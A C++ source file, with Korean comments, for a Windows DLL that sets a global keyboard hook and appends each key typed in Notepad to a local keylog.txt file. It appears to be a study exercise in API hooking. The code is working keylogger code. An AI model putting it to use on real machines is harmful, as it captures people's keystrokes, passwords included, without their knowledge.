#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <iostream>
#include <stdlib.h>

using namespace std;


#define DEF_PROCESS_NAME "notepad.exe"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;

// DllMain이 반복 호출 됨 (hookmain 실행 시)
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason, LPVOID lpvReserved)
{
    //Process 에 붙었는지 떨어졌는지
    switch(dwReason)
    {
        //attach 
        case DLL_PROCESS_ATTACH:
            g_hInstance =hinstDLL; //핸들을 hInstance로 가져옴dd
            break;
        
        //detach
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

extern "C" {
    __declspec(dllexport) void HookStart(){
        //메시지 후킹 함수
        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance,0); 
        //callback 함수가 있는 dll에서의 핸들을 가져와서 키보드 입력 시(keyboard message) 마다 KeyboardProc 수행(callback)
        // 0 : global 수행 (thread) 후킹 프로시저를 연결할 thread 식별자
        // 실행되는 모든 기존 thread 연결 (global)
    }

    __declspec(dllexport) void HookStop(){
        //g_hHook == NULL : 후킹 실패
        if(g_hHook){
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
        }
    }
}

//목표 : 메모장에서 키가 눌리지 않도록 설정 -> notepad.exe
//nCode : 코드가 0보다 작은 경우 CallNextHookEx 함수에 메시지 전달
//wParam : 키 입력 메시지를 생성한 키의 가상 키코드
//wParam, lParam을 통해 키보드 입력값을 받아옴
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    char key;
    char szPath[MAX_PATH] = {0,};
    char *p =NULL;

    if (nCode >=0)
    {
        //bit 31 : 0 => press, 1 => release
        if(!(lParam & 0x80000000))
        {
            //현재 프로세스의 전체 경로
            GetModuleFileNameA(NULL,szPath,MAX_PATH); 
            // -> szPath => "C:\windows\system32\notepad.exe"
            p = strrchr(szPath,'\\'); // '\\' 찾을 문자열 '\'
            //system32 오프셋 의미

            //메모장 application message queue로 보내지 않고 return
            //_stricmp : 둘다 소문자로 바꾸어 비교
            if(!_stricmp(p+1, DEF_PROCESS_NAME)) // 같으면 0을 반환해줌 
            {
                key=(char)wParam;
                //log 저장
                ofstream output("C:\\Users\\HP450G1\\Desktop\\coding\\keylog.txt",ios::app);
                output << key;
                output.close();
                // return 1;
            }
        }
    }

    return CallNextHookEx(g_hHook,nCode,wParam,lParam); 
}